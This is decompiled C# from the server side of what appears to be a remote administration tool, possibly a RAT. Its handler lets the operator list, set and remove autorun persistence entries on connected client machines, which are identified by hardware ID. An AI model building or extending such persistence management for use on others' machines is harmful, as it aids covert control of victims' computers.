using System;
using System.Collections;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x0200003E RID: 62
	internal class HandlerAutoRun
	{
		// Token: 0x060001AD RID: 429 RVA: 0x0001B7F8 File Offset: 0x000199F8
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Error"))
				{
					if (!(a == "List"))
					{
						if (!(a == "Set"))
						{
							if (!(a == "Remove"))
							{
								return;
							}
							if (client.Tag == null)
							{
								client.Disconnect();
								return;
							}
							FormAutoRun form = (FormAutoRun)client.Tag;
							form.Invoke(new MethodInvoker(delegate()
							{
								form.materialLabel1.Text = "Succues Remove auto run";
								foreach (object obj in ((IEnumerable)form.dataGridView2.Rows))
								{
									DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
									if ((string)dataGridViewRow.Cells[0].Value + ";" + (string)dataGridViewRow.Cells[1].Value == (string)objects[2])
									{
										form.dataGridView2.Rows.Remove(dataGridViewRow);
									}
								}
							}));
							return;
						}
						else
						{
							if (client.Tag == null)
							{
								client.Disconnect();
								return;
							}
							FormAutoRun form = (FormAutoRun)client.Tag;
							form.Invoke(new MethodInvoker(delegate()
							{
								form.materialLabel1.Text = "Succues Set auto run";
								DataGridViewRow dataGridViewRow = new DataGridViewRow();
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[2]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[3]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[4]
								});
								form.dataGridView2.Rows.Add(dataGridViewRow);
							}));
							return;
						}
					}
					else
					{
						if (client.Tag == null)
						{
							client.Disconnect();
							return;
						}
						FormAutoRun form = (FormAutoRun)client.Tag;
						form.Invoke(new MethodInvoker(delegate()
						{
							form.dataGridView2.Rows.Clear();
							form.materialLabel1.Text = "Succues auto runs";
							int i = 2;
							while (i < objects.Length)
							{
								DataGridViewRow dataGridViewRow = new DataGridViewRow();
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
								{
									Value = (string)objects[i++]
								});
								form.dataGridView2.Rows.Add(dataGridViewRow);
							}
						}));
						return;
					}
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormAutoRun form = (FormAutoRun)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.materialLabel1.Text = "Error: " + (string)objects[2];
					}));
					return;
				}
			}
			else
			{
				FormAutoRun form = (FormAutoRun)Application.OpenForms["AutoRun:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "AutoRun [" + (string)objects[2] + "]";
					form.client = client;
					form.materialLabel1.Enabled = true;
					form.dataGridView2.Enabled = true;
					form.materialLabel1.Text = "Succues Connect";
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
